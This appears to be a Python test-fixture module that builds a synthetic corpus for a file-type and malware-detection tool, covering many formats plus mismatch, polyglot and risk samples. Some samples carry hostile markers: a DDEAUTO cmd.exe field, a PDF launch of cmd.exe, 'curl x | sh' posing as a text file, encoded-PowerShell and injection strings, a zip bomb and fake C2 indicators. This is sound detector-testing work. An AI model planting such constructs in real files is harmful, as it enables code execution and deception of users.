"""Synthetic test corpus, generated in memory.

No binary samples are committed and nothing here is real malware: every file
is either built with the standard library / Pillow or is a hand-crafted header
that is just valid enough for its format. "Malicious" samples only carry the
*markers* an analyst looks for (a /JavaScript name, a vbaProject.bin entry, a
packer section name), never working payloads.
"""

from __future__ import annotations

import bz2
import gzip
import io
import lzma
import random
import sqlite3
import struct
import tarfile
import wave
import zipfile
from dataclasses import dataclass, field

from PIL import Image

RNG = random.Random(1337)


def rand_bytes(n: int) -> bytes:
    return bytes(RNG.getrandbits(8) for _ in range(n))


@dataclass
class Sample:
    name: str
    data: bytes
    expected_type: str
    group: str
    tags: dict = field(default_factory=dict)


# ------------------------------------------------------------------ builders


def make_image(fmt: str, size=(32, 24), **kwargs) -> bytes:
    img = Image.new("RGB", size, (200, 120, 40))
    for x in range(size[0]):
        img.putpixel((x, x % size[1]), (x * 7 % 255, 30, 200))
    buf = io.BytesIO()
    if fmt == "GIF":
        img = img.convert("P")
    img.save(buf, fmt, **kwargs)
    return buf.getvalue()


def _rational(v: float) -> tuple[int, int]:
    return (round(v * 10000), 10000)


def make_jpeg_with_gps(lat=19.0760, lon=72.8777, software="Adobe Photoshop 25.0") -> bytes:
    img = Image.new("RGB", (40, 30), (90, 140, 200))
    exif = Image.Exif()
    exif[0x010F] = "Canon"  # Make
    exif[0x0110] = "Canon EOS 90D"  # Model
    exif[0x0131] = software  # Software
    exif[0x0132] = "2025:03:14 18:30:00"  # DateTime (modified)
    exif_ifd = exif.get_ifd(0x8769)
    exif_ifd[0x9003] = "2025:03:14 09:15:27"  # DateTimeOriginal

    def dms(value):
        value = abs(value)
        d = int(value)
        m = int((value - d) * 60)
        s = (value - d - m / 60) * 3600
        return (d, m, s)

    gps = exif.get_ifd(0x8825)
    gps[1] = "N" if lat >= 0 else "S"
    gps[2] = dms(lat)
    gps[3] = "E" if lon >= 0 else "W"
    gps[4] = dms(lon)
    gps[6] = 14.0
    buf = io.BytesIO()
    img.save(buf, "JPEG", exif=exif)
    return buf.getvalue()


def make_cfb(entries: list[tuple[str, int]], root_clsid: bytes = b"\x00" * 16) -> bytes:
    """Build a tiny CFB file: header, one FAT sector, directory sectors. entries: (name, type)."""
    all_entries = [("Root Entry", 5), *entries]
    per_sector = 4
    n_dir = (len(all_entries) + per_sector - 1) // per_sector
    header = bytearray(512)
    header[0:8] = bytes.fromhex("D0CF11E0A1B11AE1")
    struct.pack_into("<HHHHH", header, 0x18, 0x3E, 3, 0xFFFE, 9, 6)
    struct.pack_into("<I", header, 0x2C, 1)  # number of FAT sectors
    struct.pack_into("<I", header, 0x30, 1)  # first directory sector
    struct.pack_into("<I", header, 0x38, 4096)
    struct.pack_into("<IIII", header, 0x3C, 0xFFFFFFFE, 0, 0xFFFFFFFE, 0)
    for i in range(109):
        struct.pack_into("<I", header, 0x4C + i * 4, 0xFFFFFFFF)
    struct.pack_into("<I", header, 0x4C, 0)  # FAT lives in sector 0
    fat = [0xFFFFFFFF] * 128
    fat[0] = 0xFFFFFFFD
    for i in range(n_dir):
        fat[1 + i] = 2 + i if i < n_dir - 1 else 0xFFFFFFFE
    fat_sector = struct.pack("<128I", *fat)
    dir_bytes = bytearray()
    for name, typ in all_entries:
        e = bytearray(128)
        enc = name.encode("utf-16-le") + b"\x00\x00"
        e[: len(enc)] = enc
        struct.pack_into("<H", e, 64, len(enc))
        e[66] = typ
        struct.pack_into("<III", e, 68, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF)
        if typ == 5:
            e[80:96] = root_clsid
        struct.pack_into("<I", e, 116, 0xFFFFFFFE)
        dir_bytes += e
    dir_bytes += b"\x00" * (n_dir * 512 - len(dir_bytes))
    return bytes(header) + fat_sector + bytes(dir_bytes)


def make_zip(files: dict[str, bytes], compression=zipfile.ZIP_DEFLATED) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression) as zf:
        for name, content in files.items():
            zf.writestr(name, content)
    return buf.getvalue()


CT_DOCX = b'<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>'
ROOT_RELS = b'<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>'
DOC_XML = b'<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>Quarterly report</w:t></w:r></w:p></w:body></w:document>'


def make_ooxml(kind="docx", macros=False, template_url: str | None = None, hyperlink: str | None = None,
               dde=False) -> bytes:  # fmt: skip
    prefix = {"docx": "word", "xlsx": "xl", "pptx": "ppt"}[kind]
    main = {"docx": "document.xml", "xlsx": "workbook.xml", "pptx": "presentation.xml"}[kind]
    ct = CT_DOCX.replace(b"/word/document.xml", f"/{prefix}/{main}".encode())
    if macros:
        ct = ct.replace(b"document.main+xml", b"document.macroEnabled.main+xml")
    files = {
        "[Content_Types].xml": ct,
        "_rels/.rels": ROOT_RELS.replace(b"word/document.xml", f"{prefix}/{main}".encode()),
        f"{prefix}/{main}": DOC_XML if not dde else DOC_XML.replace(
            b"<w:t>Quarterly report</w:t>", b'<w:instrText> DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc"</w:instrText>'),
    }  # fmt: skip
    rels = []
    if template_url:
        rels.append(
            '<Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/'
            f'attachedTemplate" Target="{template_url}" TargetMode="External"/>'
        )
    if hyperlink:
        rels.append(
            '<Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/'
            f'hyperlink" Target="{hyperlink}" TargetMode="External"/>'
        )
    if rels:
        files[f"{prefix}/_rels/{main}.rels"] = (
            '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/'
            'relationships">' + "".join(rels) + "</Relationships>"
        ).encode()
    if macros:
        files[f"{prefix}/vbaProject.bin"] = make_cfb([("VBA", 1), ("PROJECT", 2), ("_VBA_PROJECT", 2)])
    return make_zip(files)


def make_pe(dll=False, sections=(".text", ".data"), overlay: bytes = b"", strings: bytes = b"",
            high_entropy=False) -> bytes:  # fmt: skip
    e_lfanew = 0x80
    dos = bytearray(e_lfanew)
    dos[0:2] = b"MZ"
    dos[0x40 : 0x40 + 39] = b"This program cannot be run in DOS mode."
    struct.pack_into("<I", dos, 0x3C, e_lfanew)
    opt_size = 224
    characteristics = 0x0102 | (0x2000 if dll else 0)
    coff = struct.pack("<HHIIIHH", 0x14C, len(sections), 1700000000, 0, 0, opt_size, characteristics)
    opt = bytearray(opt_size)
    struct.pack_into("<H", opt, 0, 0x10B)
    struct.pack_into("<H", opt, 68, 2)
    headers_size = e_lfanew + 4 + 20 + opt_size + 40 * len(sections)
    raw_ptr = (headers_size + 0x1FF) & ~0x1FF
    sec_table = bytearray()
    bodies = bytearray()
    for i, name in enumerate(sections):
        body = (strings if i == 0 and strings else b"") + (
            rand_bytes(4096) if high_entropy else bytes((j * 31 + i) % 97 for j in range(1024))
        )
        body += b"\x00" * ((-len(body)) % 0x200)
        flags = 0x60000020 if i == 0 else 0xC0000040
        if name.startswith("UPX"):
            flags = 0xE0000080
        sec_table += name.encode()[:8].ljust(8, b"\x00") + struct.pack(
            "<IIIIIIHHI", len(body), 0x1000 * (i + 1), len(body), raw_ptr + len(bodies), 0, 0, 0, 0, flags
        )
        bodies += body
    head = bytes(dos) + b"PE\x00\x00" + coff + bytes(opt) + bytes(sec_table)
    head += b"\x00" * (raw_ptr - len(head))
    return head + bytes(bodies) + overlay


def make_pdf(javascript=False, open_action=False, launch=False, embedded=False, obfuscate=False,
             incremental=0, uri: str | None = None, flate_js=False, appended: bytes = b"") -> bytes:  # fmt: skip
    import zlib

    objs = []
    catalog = b"<< /Type /Catalog /Pages 2 0 R"
    if open_action:
        catalog += b" /OpenAction 4 0 R"
    if embedded:
        catalog += b" /Names << /EmbeddedFiles << /Names [(a.txt) 6 0 R] >> >>"
    catalog += b" >>"
    objs.append(catalog)
    objs.append(b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
    annots = b" /Annots [5 0 R]" if uri else b""
    objs.append(b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792]" + annots + b" >>")
    if javascript:
        name = b"/J#61vaScript" if obfuscate else b"/JavaScript"
        objs.append(b"<< /Type /Action /S " + name + b" /JS (app.alert\\('demo'\\);) >>")
    elif launch:
        objs.append(b"<< /Type /Action /S /Launch /F (cmd.exe) >>")
    else:
        objs.append(b"<< /Type /Action /S /GoTo /D [3 0 R /Fit] >>")
    if uri:
        objs.append(b"<< /Type /Annot /Subtype /Link /A << /S /URI /URI (" + uri.encode() + b") >> >>")
    else:
        objs.append(b"<< /Type /Annot /Subtype /Text >>")
    if embedded:
        objs.append(b"<< /Type /Filespec /F (a.txt) /EF << /F 7 0 R >> >>")
        objs.append(b"<< /Type /EmbeddedFile /Length 5 >>\nstream\nhello\nendstream")
    if flate_js:
        payload = zlib.compress(b"<< /S /JavaScript /JS (this.exportDataObject\\(\\)) >>")
        objs.append(
            b"<< /Type /ObjStm /Filter /FlateDecode /Length "
            + str(len(payload)).encode()
            + b" >>\nstream\n"
            + payload
            + b"\nendstream"
        )
    out = bytearray(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n")
    for i, body in enumerate(objs, start=1):
        out += f"{i} 0 obj\n".encode() + body + b"\nendobj\n"
    info_id = len(objs) + 1
    out += (
        f"{info_id} 0 obj\n<< /Title (Invoice 2291) /Author (J. Doe) /Producer (Microsoft Word) "
        "/CreationDate (D:20250314091527+05'30') /ModDate (D:20250320120000Z) >>\nendobj\n"
    ).encode()
    out += f"xref\n0 {info_id + 1}\ntrailer\n<< /Root 1 0 R /Info {info_id} 0 R >>\nstartxref\n0\n%%EOF\n".encode()
    for n in range(incremental):
        out += f"{info_id + 1 + n} 0 obj\n<< /Producer (edit {n}) >>\nendobj\nstartxref\n0\n%%EOF\n".encode()
    return bytes(out) + appended


def make_elf() -> bytes:
    h = bytearray(64)
    h[0:4] = b"\x7fELF"
    h[4], h[5], h[6] = 2, 1, 1
    struct.pack_into("<HHI", h, 16, 2, 0x3E, 1)
    return bytes(h) + bytes(range(256)) * 4


def make_sqlite() -> bytes:
    con = sqlite3.connect(":memory:")
    con.execute("create table t (id integer primary key, v text)")
    con.execute("insert into t (v) values ('evidence')")
    con.commit()
    data = con.serialize()
    con.close()
    return bytes(data)


def make_wav() -> bytes:
    buf = io.BytesIO()
    with wave.open(buf, "wb") as w:
        w.setnchannels(1)
        w.setsampwidth(2)
        w.setframerate(8000)
        w.writeframes(b"\x00\x01" * 800)
    return buf.getvalue()


def make_tar() -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w") as tf:
        content = b"hello tar\n"
        info = tarfile.TarInfo("notes.txt")
        info.size = len(content)
        tf.addfile(info, io.BytesIO(content))
    return buf.getvalue()


def bmff(brand: bytes) -> bytes:
    return struct.pack(">I", 24) + b"ftyp" + brand + b"\x00\x00\x02\x00" + brand + b"isom" + b"\x00" * 64


def pad(head: bytes, n=512, fill=b"\x00") -> bytes:
    return head + fill * max(0, n - len(head))


def make_bomb(mb=24) -> bytes:
    return make_zip({"report.txt": b"\x00" * (mb * 1024 * 1024), "readme.txt": b"see report"})


def make_overlapping_zip() -> bytes:
    data = bytearray(make_zip({"a.txt": b"A" * 100, "b.txt": b"B" * 100}))
    first = data.find(b"PK\x01\x02")
    second = data.find(b"PK\x01\x02", first + 4)
    struct.pack_into("<I", data, second + 42, 0)  # point both entries at offset 0
    return bytes(data)


def ioc_text() -> bytes:
    return (
        b"Connecting to http://update.evil-cdn.xyz/payload.bin and 185.220.101.4\n"
        b"backup C2: hxxps://files.badhost.top/x  contact ops@ransom-group.ru\n"
        b"drop to C:\\Users\\Public\\Libraries\\svch0st.exe\n"
        b"persist HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater\n"
        b"send 0.05 BTC to 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa or bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq\n"
        b"local 192.168.1.10 telemetry.microsoft.com\n"
    )


# ------------------------------------------------------------------ corpora


def type_corpus() -> list[Sample]:
    """One or more crafted samples for every detectable type."""
    S = Sample
    ole = make_cfb
    ftyp = bmff
    s = [
        S("a.jpg", make_image("JPEG"), "jpeg", "image"),
        S("a.png", make_image("PNG"), "png", "image"),
        S("a.gif", make_image("GIF"), "gif", "image"),
        S("a.bmp", make_image("BMP"), "bmp", "image"),
        S("a.tif", make_image("TIFF"), "tiff", "image"),
        S("a.webp", make_image("WEBP"), "webp", "image"),
        S("a.ico", make_image("ICO", size=(32, 32)), "ico", "image"),
        S("a.psd", pad(b"8BPS\x00\x01" + b"\x00" * 6 + b"\x00\x03"), "psd", "image"),
        S("a.heic", ftyp(b"heic"), "heic", "image"),
        S("a.avif", ftyp(b"avif"), "avif", "image"),
        S("a.jp2", pad(bytes.fromhex("0000000C6A5020200D0A870A") + b"\x00\x00\x00\x14ftypjp2 "), "jp2", "image"),
        S("a.svg", b'<?xml version="1.0"?>\n<svg xmlns="http://www.w3.org/2000/svg" width="10"/>', "svg", "image"),
        S("b.svg", b'<svg xmlns="http://www.w3.org/2000/svg"><rect/></svg>', "svg", "image"),
        S("a.pdf", make_pdf(), "pdf", "document"),
        S("a.rtf", b"{\\rtf1\\ansi\\deff0 {\\fonttbl {\\f0 Times;}} hello}", "rtf", "document"),
        S("a.ps", b"%!PS-Adobe-3.0\n%%Title: test\nshowpage\n", "postscript", "document"),
        S("a.doc", ole([("WordDocument", 2), ("1Table", 2), ("\x05SummaryInformation", 2)]), "doc", "document"),
        S("a.xls", ole([("Workbook", 2)]), "xls", "document"),
        S("a.ppt", ole([("PowerPoint Document", 2), ("Current User", 2)]), "ppt", "document"),
        S("a.msg", ole([("__substg1.0_0037001F", 2), ("__properties_version1.0", 2)]), "msg", "document"),
        S(
            "a.msi",
            ole([("\x05SummaryInformation", 2)], bytes.fromhex("84100C0000000000C000000000000046")),
            "msi",
            "executable",
        ),
        S("a.ole", ole([("Contents", 2)]), "ole", "document"),
        S("a.docx", make_ooxml("docx"), "docx", "document"),
        S("a.docm", make_ooxml("docx", macros=True), "docm", "document"),
        S("a.xlsx", make_ooxml("xlsx"), "xlsx", "document"),
        S("a.xlsm", make_ooxml("xlsx", macros=True), "xlsm", "document"),
        S("a.pptx", make_ooxml("pptx"), "pptx", "document"),
        S("a.pptm", make_ooxml("pptx", macros=True), "pptm", "document"),
        S(
            "a.odt",
            make_zip(
                {"mimetype": b"application/vnd.oasis.opendocument.text", "content.xml": b"<x/>"}, zipfile.ZIP_STORED
            ),
            "odt",
            "document",
        ),
        S(
            "a.ods",
            make_zip(
                {"mimetype": b"application/vnd.oasis.opendocument.spreadsheet", "c.xml": b"<x/>"}, zipfile.ZIP_STORED
            ),
            "ods",
            "document",
        ),
        S(
            "a.odp",
            make_zip(
                {"mimetype": b"application/vnd.oasis.opendocument.presentation", "c.xml": b"<x/>"}, zipfile.ZIP_STORED
            ),
            "odp",
            "document",
        ),
        S(
            "a.epub",
            make_zip({"mimetype": b"application/epub+zip", "META-INF/container.xml": b"<c/>"}, zipfile.ZIP_STORED),
            "epub",
            "document",
        ),
        S("a.zip", make_zip({"a.txt": b"hello", "b/c.txt": b"world"}), "zip", "archive"),
        S("empty.zip", b"PK\x05\x06" + b"\x00" * 18, "zip", "archive"),
        S("a.rar", pad(b"Rar!\x1a\x07\x00\xcf\x90\x73\x00\x00\x0d"), "rar", "archive"),
        S("a5.rar", pad(b"Rar!\x1a\x07\x01\x00\x33\x92\xb5\xe5"), "rar", "archive"),
        S("a.7z", pad(bytes.fromhex("377ABCAF271C0004")), "7z", "archive"),
        S("a.gz", gzip.compress(b"hello gzip" * 20), "gzip", "archive"),
        S("a.bz2", bz2.compress(b"hello bzip2" * 20), "bzip2", "archive"),
        S("a.xz", lzma.compress(b"hello xz" * 20), "xz", "archive"),
        S("a.zst", pad(bytes.fromhex("28B52FFD2400")), "zstd", "archive"),
        S("a.lz4", pad(bytes.fromhex("04224D186440A7")), "lz4", "archive"),
        S("a.tar", make_tar(), "tar", "archive"),
        S("a.cab", pad(b"MSCF\x00\x00\x00\x00" + struct.pack("<I", 512)), "cab", "archive"),
        S("a.iso", b"\x00" * 32768 + b"\x01CD001\x01" + b"\x00" * 2041, "iso", "archive"),
        S("a.a", b"!<arch>\n" + b"foo.o/          " + b"0" * 44 + b"`\n", "ar", "archive"),
        S("a.deb", b"!<arch>\ndebian-binary   1342943816  0     0     100644  4         `\n2.0\n", "deb", "archive"),
        S("a.rpm", pad(bytes.fromhex("EDABEEDB0300")), "rpm", "archive"),
        S(
            "a.jar",
            make_zip({"META-INF/MANIFEST.MF": b"Manifest-Version: 1.0\n", "A.class": b"\xca\xfe"}),
            "jar",
            "executable",
        ),
        S("a.apk", make_zip({"AndroidManifest.xml": b"\x03\x00", "classes.dex": b"dex\n035\x00"}), "apk", "executable"),
        S("a.exe", make_pe(), "exe", "executable"),
        S("a.dll", make_pe(dll=True), "dll", "executable"),
        S("a.com", pad(b"MZ\x90\x00" + b"\x00" * 60), "dos_exe", "executable"),
        S("a.elf", make_elf(), "elf", "executable"),
        S("a.dylib", pad(bytes.fromhex("CFFAEDFE07000001")), "macho", "executable"),
        S("b.macho", pad(bytes.fromhex("FEEDFACE00000007")), "macho", "executable"),
        S("fat.macho", pad(bytes.fromhex("CAFEBABE00000002") + b"\x01\x00\x00\x07"), "macho_fat", "executable"),
        S("A.class", pad(bytes.fromhex("CAFEBABE00000041")), "java_class", "executable"),
        S("classes.dex", pad(b"dex\n035\x00"), "dex", "executable"),
        S("a.wasm", b"\x00asm\x01\x00\x00\x00", "wasm", "executable"),
        S("a.lnk", pad(bytes.fromhex("4C0000000114020000000000C000000000000046")), "lnk", "executable"),
        S("a.py", b"#!/usr/bin/env python3\nprint('hi')\n", "script_python", "script"),
        S("a.sh", b"#!/bin/bash\necho hi\n", "script_shell", "script"),
        S("a.pl", b"#!/usr/bin/perl -w\nprint 1;\n", "script_perl", "script"),
        S("a.rb", b"#!/usr/bin/env ruby\nputs 1\n", "script_ruby", "script"),
        S("a.js", b"#!/usr/bin/env node\nconsole.log(1)\n", "script_node", "script"),
        S("a.php", b"<?php echo 'hi'; ?>\n", "script_php", "script"),
        S("a.lua", b"#!/usr/bin/lua\nprint(1)\n", "script_other", "script"),
        S("a.bat", b"@echo off\r\necho hi\r\n", "script_batch", "script"),
        S("a.html", b"<!DOCTYPE html>\n<html><head><title>x</title></head><body>hi</body></html>", "html", "markup"),
        S("a.xml", b'<?xml version="1.0" encoding="UTF-8"?>\n<root><a/></root>', "xml", "markup"),
        S("a.mp3", pad(b"ID3\x04\x00\x00\x00\x00\x00\x0a"), "mp3", "audio"),
        S("b.mp3", pad(bytes.fromhex("FFFB9064")), "mp3", "audio"),
        S("a.flac", pad(b"fLaC\x00\x00\x00\x22"), "flac", "audio"),
        S("a.ogg", pad(b"OggS\x00\x02"), "ogg", "audio"),
        S("a.wav", make_wav(), "wav", "audio"),
        S(
            "a.mid",
            b"MThd\x00\x00\x00\x06\x00\x00\x00\x01\x00\x60MTrk\x00\x00\x00\x04\x00\xff\x2f\x00",
            "midi",
            "audio",
        ),
        S("a.aac", pad(bytes.fromhex("FFF15080")), "aac", "audio"),
        S("a.m4a", ftyp(b"M4A "), "m4a", "audio"),
        S("a.mp4", ftyp(b"isom"), "mp4", "video"),
        S("b.mp4", ftyp(b"mp42"), "mp4", "video"),
        S("a.mov", ftyp(b"qt  "), "mov", "video"),
        S("a.3gp", ftyp(b"3gp5"), "3gp", "video"),
        S("a.avi", pad(b"RIFF\x00\x10\x00\x00AVI LIST"), "avi", "video"),
        S(
            "a.mkv",
            pad(bytes.fromhex("1A45DFA3A34286810142F7810142F2810442F381084282886D6174726F736B61")),
            "mkv",
            "video",
        ),
        S("a.webm", pad(bytes.fromhex("1A45DFA39F4286810142F7810142F2810442F381084282847765626D")), "webm", "video"),
        S("a.flv", pad(b"FLV\x01\x05\x00\x00\x00\x09"), "flv", "video"),
        S("a.ts", b"".join(b"\x47\x40\x00\x10" + b"\xff" * 184 for _ in range(5)), "mpegts", "video"),
        S("a.sqlite", make_sqlite(), "sqlite", "database"),
        S("a.ttf", pad(bytes.fromhex("0001000000") + b"\x0a\x00\x80"), "ttf", "font"),
        S("a.otf", pad(b"OTTO\x00\x0a"), "otf", "font"),
        S("a.woff", pad(b"wOFF\x00\x01\x00\x00"), "woff", "font"),
        S("a.woff2", pad(b"wOF2\x00\x01\x00\x00"), "woff2", "font"),
        S("a.pcap", pad(bytes.fromhex("D4C3B2A1020004000000000000000000FFFF000001000000")), "pcap", "forensic"),
        S("a.pcapng", pad(bytes.fromhex("0A0D0D0A1C0000004D3C2B1A")), "pcapng", "forensic"),
        S("NTUSER.DAT", pad(b"regf" + b"\x01" * 8), "regf", "forensic"),
        S("a.evtx", pad(b"ElfFile\x00" + b"\x00" * 8), "evtx", "forensic"),
        S("a.pem", b"-----BEGIN CERTIFICATE-----\nMIIBszCCAVmgAwIBAgIU\n-----END CERTIFICATE-----\n", "pem", "crypto"),
        S("a.txt", b"Just some meeting notes.\nNothing to see here.\n", "text", "text"),
        S("a.bin", rand_bytes(4096), "unknown", "unknown"),
    ]
    return s


def mismatch_corpus() -> list[Sample]:
    """(filename, content) pairs with the expected mismatch flag and minimum severity."""
    S = Sample
    return [
        S("invoice.pdf", make_pe(), "exe", "mismatch", {"mismatch": True, "severity": "critical"}),
        S("holiday.jpg", make_elf(), "elf", "mismatch", {"mismatch": True, "severity": "critical"}),
        S("resume.docx", make_ooxml("docx", macros=True), "docm", "mismatch", {"mismatch": True, "severity": "high"}),
        S("invoice.pdf.exe", make_pe(), "exe", "mismatch", {"mismatch": False, "severity": "high", "double": True}),
        S("report.zip", make_ooxml("docx"), "docx", "mismatch", {"mismatch": True, "severity": "low"}),
        S("photo.png", make_image("JPEG"), "jpeg", "mismatch", {"mismatch": True, "severity": "medium"}),
        S("song.mp3", make_pdf(), "pdf", "mismatch", {"mismatch": True, "severity": "medium"}),
        S(
            "readme.txt",
            b"#!/bin/sh\ncurl x | sh\n",
            "script_shell",
            "mismatch",
            {"mismatch": True, "severity": "critical"},
        ),
        S("notes.txt", b"plain notes here\n", "text", "mismatch", {"mismatch": False, "severity": "info"}),
        S("photo.jpeg", make_image("JPEG"), "jpeg", "mismatch", {"mismatch": False, "severity": "info"}),
        S("setup.exe", make_pe(), "exe", "mismatch", {"mismatch": False, "severity": "info"}),
        S("archive.zip", make_zip({"a": b"b"}), "zip", "mismatch", {"mismatch": False, "severity": "info"}),
        S("legacy.xls", make_cfb([("WordDocument", 2)]), "doc", "mismatch", {"mismatch": True, "severity": "low"}),
        S("data.xyz123", make_pdf(), "pdf", "mismatch", {"mismatch": True, "severity": "low"}),
    ]


def polyglot_corpus() -> list[Sample]:
    zip_payload = make_zip({"payload.txt": b"second file"})
    S = Sample
    return [
        S("cat.jpg", make_image("JPEG") + zip_payload, "jpeg", "polyglot", {"polyglot": True, "appended": "zip"}),
        S("cat2.jpg", make_jpeg_with_gps() + make_pe(), "jpeg", "polyglot", {"polyglot": True, "appended": "exe"}),
        S("logo.png", make_image("PNG") + zip_payload, "png", "polyglot", {"polyglot": True, "appended": "zip"}),
        S("anim.gif", make_image("GIF") + zip_payload, "gif", "polyglot", {"polyglot": True, "appended": "zip"}),
        S("doc.pdf", make_pdf(appended=zip_payload), "pdf", "polyglot", {"polyglot": True, "appended": "zip"}),
        S("clean.jpg", make_image("JPEG"), "jpeg", "polyglot", {"polyglot": False}),
        S("clean_gps.jpg", make_jpeg_with_gps(), "jpeg", "polyglot", {"polyglot": False}),
        S("clean.png", make_image("PNG"), "png", "polyglot", {"polyglot": False}),
        S("clean.gif", make_image("GIF"), "gif", "polyglot", {"polyglot": False}),
        S("clean.pdf", make_pdf(), "pdf", "polyglot", {"polyglot": False}),
        S("padded.png", make_image("PNG") + b"\x00" * 64, "png", "polyglot", {"polyglot": False}),
        S(
            "progressive.jpg",
            make_image("JPEG", size=(64, 48), progressive=True),
            "jpeg",
            "polyglot",
            {"polyglot": False},
        ),
    ]


def risk_corpus() -> list[Sample]:
    """Samples that should (malicious=True) or should not be scored medium or above."""
    S = Sample
    sus = (b"VirtualAlloc\x00WriteProcessMemory\x00CreateRemoteThread\x00URLDownloadToFileA\x00"
           b"cmd.exe /c powershell -enc AAAA\x00")  # fmt: skip
    return [
        S("js.pdf", make_pdf(javascript=True, open_action=True), "pdf", "risk", {"malicious": True}),
        S("obf.pdf", make_pdf(javascript=True, obfuscate=True), "pdf", "risk", {"malicious": True}),
        S("launch.pdf", make_pdf(launch=True, open_action=True), "pdf", "risk", {"malicious": True}),
        S("hidden.pdf", make_pdf(flate_js=True, open_action=True), "pdf", "risk", {"malicious": True}),
        S("macro.docm", make_ooxml("docx", macros=True), "docm", "risk", {"malicious": True}),
        S(
            "template.docx",
            make_ooxml("docx", template_url="http://198.51.100.7/t.dotm"),
            "docx",
            "risk",
            {"malicious": True},
        ),
        S("dde.docx", make_ooxml("docx", dde=True), "docx", "risk", {"malicious": True}),
        S("bomb.zip", make_bomb(), "zip", "risk", {"malicious": True}),
        S("overlap.zip", make_overlapping_zip(), "zip", "risk", {"malicious": True}),
        S("packed.exe", make_pe(sections=("UPX0", "UPX1"), high_entropy=True), "exe", "risk", {"malicious": True}),
        S("loader.exe", make_pe(strings=sus), "exe", "risk", {"malicious": True}),
        S("invoice.pdf", make_pe(), "exe", "risk", {"malicious": True}),
        S(
            "ole_macro.doc",
            make_cfb([("WordDocument", 2), ("Macros", 1), ("VBA", 1), ("_VBA_PROJECT", 2)]),
            "doc",
            "risk",
            {"malicious": True},
        ),
        S("note.txt", ioc_text(), "text", "risk", {"malicious": True}),
        S("cat.jpg", make_image("JPEG") + make_zip({"x.exe": make_pe()}), "jpeg", "risk", {"malicious": True}),
        S("report.pdf", make_pdf(uri="https://example.com/terms"), "pdf", "risk", {"malicious": False}),
        S("letter.docx", make_ooxml("docx", hyperlink="https://example.org"), "docx", "risk", {"malicious": False}),
        S("sheet.xlsx", make_ooxml("xlsx"), "xlsx", "risk", {"malicious": False}),
        S("photo.jpg", make_image("JPEG"), "jpeg", "risk", {"malicious": False}),
        S("icon.png", make_image("PNG"), "png", "risk", {"malicious": False}),
        S("backup.zip", make_zip({"a.txt": b"hello " * 100}), "zip", "risk", {"malicious": False}),
        S("notes.txt", b"Meeting at 10. Bring the slides.\n" * 20, "text", "risk", {"malicious": False}),
        S("song.wav", make_wav(), "wav", "risk", {"malicious": False}),
        S("db.sqlite", make_sqlite(), "sqlite", "risk", {"malicious": False}),
        S("multi.pdf", make_pdf(incremental=2), "pdf", "risk", {"malicious": False}),
        S("archive.tar", make_tar(), "tar", "risk", {"malicious": False}),
        S("data.gz", gzip.compress(rand_bytes(2048)), "gzip", "risk", {"malicious": False}),
    ]
